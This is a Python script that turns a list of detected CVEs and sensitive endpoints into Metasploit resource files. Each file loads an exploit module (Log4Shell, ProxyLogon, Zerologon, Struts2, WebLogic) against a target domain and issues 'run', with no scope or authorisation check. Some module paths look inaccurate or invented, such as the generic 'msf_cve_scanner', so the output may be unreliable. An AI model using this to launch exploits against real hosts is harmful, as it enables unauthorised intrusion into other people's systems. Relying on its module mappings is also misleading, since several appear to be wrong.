#!/usr/bin/env python3
import sys, re, pathlib, json

# CVE to Metasploit module mapping
CVE_MODULE_MAP = {
    'CVE-2021-44228': 'exploit/multi/http/log4shell_header_injection',
    'CVE-2021-45046': 'exploit/multi/http/log4shell_header_injection',
    'CVE-2017-5638': 'exploit/multi/http/struts2_content_type',
    'CVE-2017-12615': 'exploit/multi/http/tomcat_jsp_upload_bypass',
    'CVE-2019-2725': 'exploit/multi/http/oracle_weblogic_deserialization',
    'CVE-2020-1472': 'exploit/windows/smb/zerologon',
    'CVE-2021-26855': 'exploit/windows/http/exchange_proxylogon_rce',
    'CVE-2021-26857': 'exploit/windows/http/exchange_proxylogon_rce',
    'CVE-2021-26858': 'exploit/windows/http/exchange_proxylogon_rce',
    'CVE-2021-27065': 'exploit/windows/http/exchange_proxylogon_rce'
}

def make_cve_rc(cve, target):
    """Generate Metasploit RC for specific CVE"""
    if cve in CVE_MODULE_MAP:
        module = CVE_MODULE_MAP[cve]
        rc = f"""
use {module}
set RHOSTS {target}
set RPORT 80
run
"""
    else:
        # Generic CVE scanner
        rc = f"""
use auxiliary/scanner/http/msf_cve_scanner
set RHOSTS {target}
set TARGETURI /
set CVE {cve}
run
"""
    return rc.strip()

def make_sensitive_endpoint_rc(endpoints, target):
    """Generate Metasploit RC for sensitive endpoints"""
    rc = ""
    for endpoint in endpoints[:10]:  # Limit to first 10 endpoints
        rc += f"""
use auxiliary/scanner/http/dir_scanner
set RHOSTS {target}
set RPORT 80
set TARGETURI {endpoint}
run
"""
    return rc.strip()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: gen_msf_rc.py <worklist-dir> <target-domain>")
        sys.exit(1)

    worklist_dir, target = sys.argv[1], sys.argv[2]
    out = pathlib.Path("audit")/f"{target}-auto.rc"
    
    # Create audit directory if it doesn't exist
    pathlib.Path("audit").mkdir(exist_ok=True)
    
    rc_content = []
    cves_found = False
    
    # Process CVEs
    cvefile = pathlib.Path(worklist_dir) / "cves.txt"
    if cvefile.exists():
        with open(cvefile) as f:
            for line in f:
                cve = line.strip()
                if not cve or not cve.startswith("CVE-"):
                    continue
                rc_content.append(make_cve_rc(cve, target))
                print(f"[+] Generated MSF RC for {cve} → {target}")
                cves_found = True
    
    # Process sensitive endpoints if CVEs found
    if cves_found:
        sensitive_file = pathlib.Path(worklist_dir) / "sensitive_critical.txt"
        if sensitive_file.exists():
            with open(sensitive_file) as f:
                endpoints = [line.strip() for line in f if line.strip()]
                if endpoints:
                    rc_content.append(make_sensitive_endpoint_rc(endpoints, target))
                    print(f"[+] Added sensitive endpoint scanning for {len(endpoints)} critical endpoints")
    
    # Write combined RC file
    if rc_content:
        with open(out, 'w') as f:
            f.write("\n\n".join(rc_content))
        print(f"[+] Wrote targeted MSF RC file: {out}")
        print(f"[*] Only generated modules for detected CVEs and critical endpoints")
    else:
        print("[!] No CVEs found to generate MSF RC")
        print("[*] Skipping Metasploit RC generation - no exploitable vulnerabilities detected")
